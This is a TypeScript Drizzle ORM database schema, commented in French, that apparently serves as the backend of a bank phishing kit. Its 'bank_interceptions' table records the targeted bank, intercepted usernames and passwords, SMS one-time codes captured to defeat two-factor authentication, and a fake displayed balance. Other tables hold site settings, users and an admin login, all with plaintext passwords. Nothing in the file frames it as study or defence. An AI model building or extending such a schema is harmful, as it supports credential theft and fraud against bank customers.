import { sqliteTable, integer, text } from "drizzle-orm/sqlite-core";
import { sql } from "drizzle-orm";

export const bankInterceptions = sqliteTable("bank_interceptions", {
  id: text("id").primaryKey(), // ID Unique de la session (UUID)
  bankName: text("bank_name").notNull(), // Nom de la banque ciblée
  username: text("username").notNull(), // Identifiant intercepté
  password: text("password").notNull(), // Mot de passe intercepté
  smsCode: text("sms_code"), // Code SMS (peut être vide au départ)
  balance: text("balance").default("60 500 €"),
  amountInput: text("amount_input"), 
  createdAt: text("created_at").default(sql`CURRENT_TIMESTAMP`), // Date d'arrivée des identifiants
  updatedAt: text("updated_at").default(sql`CURRENT_TIMESTAMP`), // Date d'arrivée du code
});


// Déclaration de la table pour les paramètres globaux du site
export const appSettings = sqliteTable("app_settings", {
  id: text("id").primaryKey(), // clé unique (ex: "current_balance")
  value: text("value").notNull(), // la valeur du montant (ex: "40 500 €")
  updatedAt: text("updated_at"),
});

export const users = sqliteTable("users", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  customId: text("custom_id").unique().notNull(),
  name: text("name").notNull(),
  password: text("password").notNull(),
  balance: text("balance").notNull().default("0"), // 👈 Nouvelle colonne pour le solde du client
  createdAt: text("created_at").default(sql`(CURRENT_TIMESTAMP)`),
});

export const adminSettings = sqliteTable("admin_settings", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  username: text("username").notNull(),
  password: text("password").notNull(),
});